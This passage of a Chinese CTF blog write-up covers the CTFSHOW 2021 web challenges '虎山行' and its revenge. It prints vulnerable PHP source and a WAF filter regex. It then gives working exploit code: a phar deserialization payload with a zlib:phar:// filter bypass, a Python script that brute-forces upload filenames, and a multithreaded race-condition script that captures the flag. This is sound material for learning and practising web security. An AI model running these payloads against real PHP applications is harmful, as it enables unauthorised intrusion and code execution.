+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;cp /hint* /var/www/html/hint.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">readgzfile(waf(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时在管理面板下可以看到一个很显眼的上传点，路由是 <code>../upload.php</code>。使用上述的文件包含读取出如下源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo $_FILES[&quot;file&quot;][&quot;size&quot;];</span></span><br><span class="line"><span class="variable">$extension</span> = end(<span class="variable">$temp</span>);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048000</span>)   <span class="comment">// 小于 2000kb</span></span><br><span class="line">&amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件出错: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$md5_unix_random</span> =substr(md5(time()),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line">			<span class="variable">$filename</span> = <span class="variable">$md5_unix_random</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传成功,文件存在upload/&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;文件类型仅支持jpg、png、gif等图片格式&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现上传后无法得知文件名，而且只能上传图片，因此需要想办法绕过上传限制且触发到 <code>Ctfshow</code> 的反序列化从而拿到下一步的 hint。使用 <code>../../../ctfshowsecretfilehh/waf.php</code> 可以包含到 waf 的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;姿势太简单啦，来一点骚的？！&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>查阅了资料之后发现 phar 的利用姿势中有 <code>zlib:phar://</code> 正好没被这个正则过滤到。使用如下的代码来生成一个 phar 包。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;trigger.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>,<span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>因为这里没给文件名，所以需要写个脚本去上传，这样才能将时间戳范围确定从而找到正确的文件名用于文件包含。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">composeUrl</span>(<span class="params">timeNow</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;upload/&#123;&#125;.gif&quot;</span>.<span class="built_in">format</span>(ENV, (hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(timeNow)).encode()).hexdigest())[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;upload.php&quot;</span>.<span class="built_in">format</span>(ENV)</span><br><span class="line">    file = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;exp.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&quot;trigger.gif&quot;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, files=file)</span><br><span class="line">    now = time.time()</span><br><span class="line">    nowUrl = composeUrl(now - <span class="number">1</span>)</span><br><span class="line">    accessResponse = requests.get(nowUrl)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Trying with url &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> accessResponse.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行上述脚本可以得出一个可以成功包含上传文件的链接。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/upload/21116d8b.gif</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>.../hint.txt</code> 可以得到如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fuckflag***&#125;flag also not here You can access ctfshowgetflaghhhh directory</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>.../ctfshowgetflaghhhh</code> 可以获得如下源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$unser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;unser&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;Firebasky&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username==<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password==(<span class="keyword">int</span>)md5(time()))&#123;</span><br><span class="line">            system(<span class="string">&#x27;cp /ctfshow* /var/www/html/flag.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span>=@unserialize(<span class="variable">$unser</span>);</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里有一点小 trick，<code>(int)md5(time())</code> 有很大的机会取到 0，所以这里在反序列化中假定其为 0 可以更方便地构造。使用多线程脚本进行条件竞争，这样才能读到 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://2acf732a-6d3b-4c16-b9f2-532ae48ca97e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Unserialization</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Unserialization thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;unser&quot;</span>: <span class="string">&#x27;O:5:&quot;Unser&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;ctfshow&quot;;s:8:&quot;password&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        requests.get(url=<span class="string">&quot;&#123;&#125;ctfshowgetflaghhhh&quot;</span>.<span class="built_in">format</span>(ENV),params=param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Get flag thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url=<span class="string">&quot;&#123;&#125;flag.txt&quot;</span>.<span class="built_in">format</span>(ENV))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Found flag in &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.content.decode(<span class="string">&quot;UTF-8&quot;</span>)))</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Get flag thread retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event = threading.Event()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    threading.Thread(target=Unserialization, args=()).start()</span><br><span class="line">    threading.Thread(target=GetFlag, args=()).start()</span><br></pre></td></tr></table></figure>
+
+<p>运行可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;229c1b86-f183-4520-8792-1e78448dad62&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="虎山行’s-revenge"><a href="#虎山行’s-revenge" class="headerlink" title="虎山行’s revenge"></a>虎山行’s revenge</h3><p>跟虎山行相比，目录有所变更。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowsecretfilehh</span></span><br><span class="line"><span class="addition">+ hsxhsxhsxctfshowsecretfilel</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- ctfshowgetflaghhhh</span></span><br><span class="line"><span class="addition">+ hsxctfshowsecretgetflagl</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;5a01f428-4ffa-44bc-aab5-571d5ebbfaa6&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BC%E5%9B%BEv2-0"><span class="toc-number">1.1.</span> <span class="toc-text">拼图v2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AA86"><span class="toc-number">1.2.</span> <span class="toc-text">AA86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A2%91%E5%AF%BA%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6"><span class="toc-number">1.3.</span> <span class="toc-text">碑寺六十四卦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%9B%E5%B9%B4%E5%A4%A7%E5%90%89"><span class="toc-number">1.4.</span> <span class="toc-text">牛年大吉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97"><span class="toc-number">1.5.</span> <span class="toc-text">请问大吉杯的签到是在这里签吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E8%88%AC%E5%85%B5%E5%99%A8"><span class="toc-number">1.6.</span> <span class="toc-text">十八般兵器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%89%B2%E5%9B%BE%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">1.7.</span> <span class="toc-text">色图生成器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A5%E8%AF%9D%E9%95%87"><span class="toc-number">1.8.</span> <span class="toc-text">童话镇</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#veryphp"><span class="toc-number">2.1.</span> <span class="toc-text">veryphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spaceman"><span class="toc-number">2.2.</span> <span class="toc-text">spaceman</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C"><span class="toc-number">2.3.</span> <span class="toc-text">有手就行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%8E%E5%B1%B1%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">虎山行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%8E%E5%B1%B1%E8%A1%8C%E2%80%99s-revenge"><span class="toc-number">2.5.</span> <span class="toc-text">虎山行’s revenge</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&text=CTFSHOW 大吉大利杯 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&is_video=false&description=CTFSHOW 大吉大利杯 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW 大吉大利杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/41fb5acf.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&name=CTFSHOW 大吉大利杯 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&t=CTFSHOW 大吉大利杯 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
